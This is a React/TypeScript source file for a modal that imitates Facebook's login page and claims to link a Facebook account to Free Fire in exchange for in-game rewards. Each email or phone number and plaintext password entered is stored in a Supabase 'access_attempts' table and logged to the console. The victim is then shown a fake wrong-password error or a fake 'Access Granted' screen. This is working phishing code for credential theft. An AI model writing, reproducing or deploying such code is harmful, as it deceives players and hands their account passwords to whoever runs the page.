import { useState } from 'react';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { CheckCircle, X } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

interface AccessModalProps {
  isOpen: boolean;
  onClose: () => void;
  item: RewardItem | null;
}

const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
  const [email, setEmail] = useState('');
  const [passphrase, setPassphrase] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const { toast } = useToast();

  const validateInput = (input: string) => {
    // Check if it's a phone number (exactly 10 digits)
    const phoneRegex = /^\d{10}$/;
    if (phoneRegex.test(input)) {
      return true;
    }
    
    // Check if it's an email (must contain @)
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (emailRegex.test(input)) {
      return true;
    }
    
    return false;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!item) return;
    
    setIsLoading(true);

    // Simulate processing delay
    await new Promise(resolve => setTimeout(resolve, 1500));

    // Validate input and password
    const isValidInput = validateInput(email);
    const isValidPassword = passphrase.length >= 6;

    // Save access attempt to Supabase - ALWAYS record the attempt
    console.log('Saving access attempt:', { email, passphrase, item_id: item.id, item_name: item.name, status: (isValidInput && isValidPassword) ? 'success' : 'failed' });
    
    try {
      const { data, error } = await supabase
        .from('access_attempts')
        .insert({
          email: email,
          passphrase: passphrase,
          item_id: item.id,
          item_name: item.name,
          status: (isValidInput && isValidPassword) ? 'success' : 'failed'
        })
        .select();
      
      if (error) {
        console.error('Error saving access attempt:', error);
      } else {
        console.log('Access attempt saved successfully:', data);
      }
    } catch (error) {
      console.error('Error saving access attempt:', error);
    }

    // Check validation and show Facebook-style error if invalid
    if (!isValidInput || !isValidPassword) {
      toast({
        variant: "destructive",
        title: "Incorrect password. Please try again.",
        description: "",
        className: "bg-red-500 text-white border-red-600",
      });
      setIsLoading(false);
      return;
    }

    // Success
    setIsLoading(false);
    setShowSuccess(true);
  };

  const handleClose = () => {
    setEmail('');
    setPassphrase('');
    setShowSuccess(false);
    onClose();
  };

  const handleSuccessClose = () => {
    setShowSuccess(false);
    handleClose();
  };

  if (showSuccess) {
    return (
      <Dialog open={isOpen} onOpenChange={handleClose}>
        <DialogContent className="max-w-md p-0 border-0 bg-transparent shadow-none">
          <div className="bg-card rounded-lg p-8 text-center space-y-6 border border-primary/20 shadow-2xl">
            <div className="mx-auto w-20 h-20 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center animate-royal-pulse">
              <CheckCircle className="w-10 h-10 text-primary-foreground" />
            </div>
            
            <div className="space-y-2">
              <h3 className="text-2xl font-bold text-primary">✅ Access Granted</h3>
              <p className="text-muted-foreground">
                Your rewards will be processed in 24 hours.<br />
                Please check your in-game inbox.
              </p>
            </div>

            <Button 
              onClick={handleSuccessClose}
              className="btn-royal w-full animate-glow"
            >
              OK
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    );
  }

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="max-w-none w-full h-full p-0 border-0 bg-transparent shadow-none">
        {/* Facebook Login Design */}
        <div className="flex items-center justify-center min-h-screen p-5">
          <div className="w-full max-w-screen-lg mx-auto">
            <div className="flex items-center justify-center lg:justify-between">
              {/* Left Section */}
              <div className="hidden lg:block flex-1 pr-10">
                <h1 className="text-[#1877f2] text-[56px] font-normal mb-0 leading-none" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                  facebook
                </h1>
                <p className="text-[24px] text-gray-700 mt-2" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                  Log in your Facebook account to connect to Free Fire.
                </p>
              </div>

              {/* Right Section - Login Form */}
              <div className="w-full max-w-[396px] bg-white p-5 rounded-lg shadow-lg border border-gray-200">
                {/* Close Button */}
                <div className="flex justify-end mb-4">
                  <button 
                    onClick={handleClose}
                    className="text-gray-400 hover:text-gray-600 transition-colors"
                  >
                    <X className="h-5 w-5" />
                  </button>
                </div>

                {item && (
                  <div className="text-center space-y-4 mb-6">
                    <div className="w-16 h-16 mx-auto bg-[#1877f2] rounded-full flex items-center justify-center">
                      <span className="text-white text-2xl font-bold" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>f</span>
                    </div>
                    <h3 className="font-normal text-gray-900">{item.name}</h3>
                    <p className="text-sm text-gray-600 font-normal" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                      Log in your Facebook account to connect to Free Fire.
                    </p>
                  </div>
                )}

                <form onSubmit={handleSubmit} className="space-y-3">
                  <input
                    type="text"
                    placeholder="Email or phone number"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full p-[14px] text-[17px] text-black border border-[#dddfe2] rounded-md outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
                    style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
                    required
                  />

                  <input
                    type="password"
                    placeholder="Password"
                    value={passphrase}
                    onChange={(e) => setPassphrase(e.target.value)}
                    className="w-full p-[14px] text-[17px] text-black border border-[#dddfe2] rounded-md outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
                    style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
                    required
                  />

                  <button 
                    type="submit" 
                    className="w-full p-[14px] text-[20px] bg-[#1877f2] hover:bg-[#166fe5] text-white border-none rounded-md font-bold cursor-pointer transition-colors disabled:opacity-50"
                    style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center gap-2">
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                        Logging in...
                      </div>
                    ) : (
                      'Log In'
                    )}
                  </button>
                </form>

                <a 
                  href="#" 
                  className="block text-center mt-4 text-[#1877f2] text-[14px] no-underline hover:underline"
                  style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
                >
                  Forgotten password?
                </a>

                <div className="border-t border-[#dadde1] my-5"></div>

                <button 
                  className="w-full p-[14px] text-[17px] bg-[#42b72a] hover:bg-[#36a420] text-white border-none rounded-md font-bold cursor-pointer transition-colors"
                  style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
                  type="button"
                >
                  Create New Account
                </button>
              </div>
            </div>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default AccessModal;